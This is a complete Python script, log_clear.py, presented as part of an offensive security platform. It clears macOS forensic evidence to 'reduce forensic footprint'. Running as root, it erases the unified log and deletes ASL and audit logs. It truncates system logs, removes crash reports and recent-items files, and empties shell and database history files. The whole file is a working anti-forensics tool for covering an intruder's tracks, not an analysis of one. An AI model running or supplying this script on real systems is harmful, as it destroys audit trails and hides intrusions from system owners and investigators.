#!/usr/bin/env python3
"""
log_clear.py — Clear macOS system logs, audit logs, and forensic artifacts.

Clears unified logs, ASL logs, audit logs, crash reports, analytics data,
and shell history to reduce forensic footprint.

Requires: root privileges for system-level log clearing.

Part of CyberStrike offensive security platform.
"""

import argparse
import glob
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path


class LogClearer:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.total_bytes_freed = 0

    def check_root(self):
        if os.geteuid() != 0:
            print(
                "WARNING: Running without root — some logs cannot be cleared.",
                file=sys.stderr,
            )

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — macOS Log Clearer")
        print("=" * 60)
        print(f"PID:     {os.getpid()}")
        print(f"Output:  {'JSON' if self.args.json_output else 'text'}")
        print(f"Started: {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, _signum, _frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = record.get("status", "N/A")
            category = record.get("category", "N/A")
            detail = record.get("detail", "")
            bytes_freed = record.get("bytes_freed", 0)
            freed_str = f" ({self.format_bytes(bytes_freed)})" if bytes_freed > 0 else ""
            print(f"[{status:<8}] {category:<25} {detail}{freed_str}", flush=True)

    def format_bytes(self, size):
        """Format byte size to human-readable string."""
        for unit in ["B", "KB", "MB", "GB"]:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"

    def get_dir_size(self, dir_path):
        """Get total size of files in a directory."""
        total = 0
        p = Path(dir_path)
        if p.exists():
            for f in p.rglob("*"):
                if f.is_file():
                    try:
                        total += f.stat().st_size
                    except (PermissionError, OSError):
                        pass
        return total

    def get_file_size(self, file_path):
        """Get file size, returning 0 if not found."""
        try:
            return Path(file_path).stat().st_size
        except (FileNotFoundError, PermissionError, OSError):
            return 0

    def clear_unified_log(self):
        """Clear macOS Unified Logging via `log erase`."""
        if not self.running:
            return
        try:
            result = subprocess.run(
                ["log", "erase", "--all"],
                capture_output=True,
                text=True,
                timeout=30,
            )
            success = result.returncode == 0
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "category": "unified_log",
                    "action": "erase",
                    "status": "cleared" if success else "failed",
                    "detail": "log erase --all",
                    "bytes_freed": 0,
                    "error": result.stderr.strip() if not success else "",
                }
            )
        except Exception as e:
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "category": "unified_log",
                    "action": "erase",
                    "status": "error",
                    "detail": str(e),
                    "bytes_freed": 0,
                }
            )

    def clear_asl_logs(self):
        """Clear ASL (Apple System Log) files."""
        if not self.running:
            return
        asl_dir = Path("/var/log/asl")
        if not asl_dir.exists():
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "category": "asl_logs",
                    "action": "clear",
                    "status": "skipped",
                    "detail": "/var/log/asl not found",
                    "bytes_freed": 0,
                }
            )
            return

        bytes_before = self.get_dir_size(asl_dir)
        files_removed = 0

        for asl_file in asl_dir.glob("*.asl"):
            if not self.running:
                break
            try:
                asl_file.unlink()
                files_removed += 1
            except (PermissionError, OSError):
                pass

        bytes_after = self.get_dir_size(asl_dir)
        freed = max(0, bytes_before - bytes_after)
        self.total_bytes_freed += freed

        self.emit(
            {
                "timestamp": datetime.now().isoformat(),
                "category": "asl_logs",
                "action": "clear",
                "status": "cleared",
                "detail": f"{files_removed} ASL files removed",
                "files_count": files_removed,
                "bytes_freed": freed,
            }
        )

    def clear_system_log(self):
        """Truncate /var/log/system.log and other log files."""
        if not self.running:
            return
        log_files = [
            "/var/log/system.log",
            "/var/log/install.log",
            "/var/log/wifi.log",
            "/var/log/powermanagement",
        ]

        for log_file in log_files:
            if not self.running:
                break
            p = Path(log_file)
            if not p.exists():
                continue
            size = self.get_file_size(log_file)
            try:
                with open(log_file, "w") as f:
                    f.truncate(0)
                self.total_bytes_freed += size
                self.emit(
                    {
                        "timestamp": datetime.now().isoformat(),
                        "category": "system_log",
                        "action": "truncate",
                        "status": "cleared",
                        "detail": log_file,
                        "bytes_freed": size,
                    }
                )
            except (PermissionError, OSError) as e:
                self.emit(
                    {
                        "timestamp": datetime.now().isoformat(),
                        "category": "system_log",
                        "action": "truncate",
                        "status": "failed",
                        "detail": log_file,
                        "bytes_freed": 0,
                        "error": str(e),
                    }
                )

    def clear_audit_logs(self):
        """Clear BSM audit logs in /var/audit/."""
        if not self.running:
            return
        audit_dir = Path("/var/audit")
        if not audit_dir.exists():
            return

        bytes_before = self.get_dir_size(audit_dir)
        files_removed = 0

        for audit_file in audit_dir.iterdir():
            if not self.running:
                break
            if audit_file.is_file() and audit_file.name != "current":
                try:
                    audit_file.unlink()
                    files_removed += 1
                except (PermissionError, OSError):
                    pass

        current_file = audit_dir / "current"
        if current_file.exists():
            try:
                with open(current_file, "w") as f:
                    f.truncate(0)
            except (PermissionError, OSError):
                pass

        bytes_after = self.get_dir_size(audit_dir)
        freed = max(0, bytes_before - bytes_after)
        self.total_bytes_freed += freed

        self.emit(
            {
                "timestamp": datetime.now().isoformat(),
                "category": "audit_logs",
                "action": "clear",
                "status": "cleared",
                "detail": f"{files_removed} audit files removed",
                "files_count": files_removed,
                "bytes_freed": freed,
            }
        )

    def clear_crash_reports(self):
        """Clear crash reports and diagnostic data."""
        if not self.running:
            return
        crash_dirs = [
            Path.home() / "Library/Logs/DiagnosticReports",
            Path("/Library/Logs/DiagnosticReports"),
            Path.home() / "Library/Logs/CrashReporter",
            Path("/Library/Logs/CrashReporter"),
        ]

        total_freed = 0
        total_files = 0

        for crash_dir in crash_dirs:
            if not self.running:
                break
            if not crash_dir.exists():
                continue

            bytes_before = self.get_dir_size(crash_dir)
            files_removed = 0

            for f in crash_dir.rglob("*"):
                if not self.running:
                    break
                if f.is_file():
                    try:
                        f.unlink()
                        files_removed += 1
                    except (PermissionError, OSError):
                        pass

            bytes_after = self.get_dir_size(crash_dir)
            freed = max(0, bytes_before - bytes_after)
            total_freed += freed
            total_files += files_removed

        self.total_bytes_freed += total_freed
        self.emit(
            {
                "timestamp": datetime.now().isoformat(),
                "category": "crash_reports",
                "action": "clear",
                "status": "cleared",
                "detail": f"{total_files} crash reports removed",
                "files_count": total_files,
                "bytes_freed": total_freed,
            }
        )

    def clear_shell_history(self):
        """Clear shell history files for current user."""
        if not self.running:
            return
        history_files = [
            Path.home() / ".bash_history",
            Path.home() / ".zsh_history",
            Path.home() / ".sh_history",
            Path.home() / ".python_history",
            Path.home() / ".node_repl_history",
            Path.home() / ".psql_history",
            Path.home() / ".mysql_history",
            Path.home() / ".sqlite_history",
        ]

        total_freed = 0
        files_cleared = 0

        for hist_file in history_files:
            if not self.running:
                break
            if not hist_file.exists():
                continue
            size = self.get_file_size(str(hist_file))
            try:
                with open(hist_file, "w") as f:
                    f.truncate(0)
                total_freed += size
                files_cleared += 1
            except (PermissionError, OSError):
                pass

        self.total_bytes_freed += total_freed
        self.emit(
            {
                "timestamp": datetime.now().isoformat(),
                "category": "shell_history",
                "action": "truncate",
                "status": "cleared",
                "detail": f"{files_cleared} history files truncated",
                "files_count": files_cleared,
                "bytes_freed": total_freed,
            }
        )

    def clear_recent_items(self):
        """Clear recent items and application support logs."""
        if not self.running:
            return
        recent_dirs = [
            Path.home() / "Library/Application Support/com.apple.sharedfilelist",
        ]

        total_freed = 0
        total_files = 0

        for recent_dir in recent_dirs:
            if not self.running:
                break
            if not recent_dir.exists():
                continue

            for f in recent_dir.glob("*.sfl2"):
                if not self.running:
                    break
                if f.is_file():
                    size = self.get_file_size(str(f))
                    try:
                        f.unlink()
                        total_freed += size
                        total_files += 1
                    except (PermissionError, OSError):
                        pass

        self.total_bytes_freed += total_freed
        if total_files > 0:
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "category": "recent_items",
                    "action": "clear",
                    "status": "cleared",
                    "detail": f"{total_files} recent item files removed",
                    "files_count": total_files,
                    "bytes_freed": total_freed,
                }
            )

    def run(self):
        self.check_root()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        operations = [
            self.clear_unified_log,
            self.clear_asl_logs,
            self.clear_system_log,
            self.clear_audit_logs,
            self.clear_crash_reports,
            self.clear_shell_history,
            self.clear_recent_items,
        ]

        for op in operations:
            if not self.running:
                break
            op()

        self.cleanup()

    def cleanup(self):
        print(f"\n--- log_clear summary ---")
        print(f"Operations: {self.event_count}")
        print(f"Total freed: {self.format_bytes(self.total_bytes_freed)}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Clear macOS system logs, audit logs, and forensic artifacts.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 log_clear.py\n"
            "  sudo python3 log_clear.py --json-output\n"
            "  sudo python3 log_clear.py --json-output | jq 'select(.bytes_freed > 0)'\n"
        ),
    )
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    clearer = LogClearer(args)
    clearer.run()


if __name__ == "__main__":
    main()
